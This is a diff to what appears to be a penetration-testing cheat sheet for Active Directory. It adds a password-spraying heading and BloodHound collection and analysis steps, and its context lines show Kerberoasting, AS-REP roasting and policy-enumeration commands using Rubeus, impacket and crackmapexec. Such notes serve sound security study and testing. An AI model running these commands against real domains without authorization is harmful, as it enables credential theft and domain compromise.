@@ -1,3 +1,5 @@
+
+### Password Spraying
 #### Check Policy
 ```
 crackmapexec <ip> -u <user> -p <password> --pass-pol
@@ -32,3 +34,23 @@ impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -ou
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 impacket-GetUserSPNs --request -dc-ip <ip> <domain>/<user>:<password>
 ```
+
+
+### BloodHound
+#### Data collection
+```
+powershell -ep bypass
+Import-Module .\sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\<user>\Desktop\ -OutputPrefix "audit results"
+```
+#### Data Analysis
+
+```
+sudo neo4j start
+sudo bloodhound
+http://localhost:7474 (neo4j:kali)
+```
+- Import zipped data.
+- Check Shortest Paths Analysis.
+- Right click objects that are owned. For example users and client machines.
+- Then choose "Shortest Path to Domain Admins from owned Principals".
